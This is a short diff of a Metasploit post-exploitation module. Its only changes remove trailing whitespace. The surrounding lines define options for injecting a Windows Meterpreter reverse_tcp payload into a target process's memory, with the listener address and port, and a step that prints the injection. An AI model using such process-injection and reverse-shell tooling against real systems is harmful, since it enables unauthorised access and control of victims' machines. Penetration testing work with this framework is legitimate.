@@ -30,16 +30,16 @@ class Metasploit3 < Msf::Post
 			))
 		register_options(
 			[
-				OptString.new('PAYLOAD', 
+				OptString.new('PAYLOAD',
 					[false, 'Windows Payload to inject into memory of a process.',
 						"windows/meterpreter/reverse_tcp"]),
-				OptAddress.new('LHOST', 
+				OptAddress.new('LHOST',
 					[true, 'IP of host that will receive the connection from the payload.']),
-				OptInt.new('LPORT', 
+				OptInt.new('LPORT',
 					[false, 'Port for Payload to connect to.', 4433]),
-				OptInt.new('PID', 
+				OptInt.new('PID',
 					[false, 'Process Identifier to inject of process to inject payload.']),
-				OptBool.new('HANDLER', 
+				OptBool.new('HANDLER',
 					[ false, 'Start an Exploit Multi Handler to receive the connection', false]),
 				OptString.new('OPTIONS',
 				[false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",
@@ -178,7 +178,7 @@ class Metasploit3 < Msf::Post
 		print_status("Performing Architecture Check")
 		# If architecture check fails and a new process is wished to inject to one with the proper arch
 		# will be created
-		if arch_check(pay,pid) 
+		if arch_check(pay,pid)
 			pid = create_temp_proc(pay) if newproc
 			print_status("Injecting #{pay.name} into process ID #{pid}")
 			begin
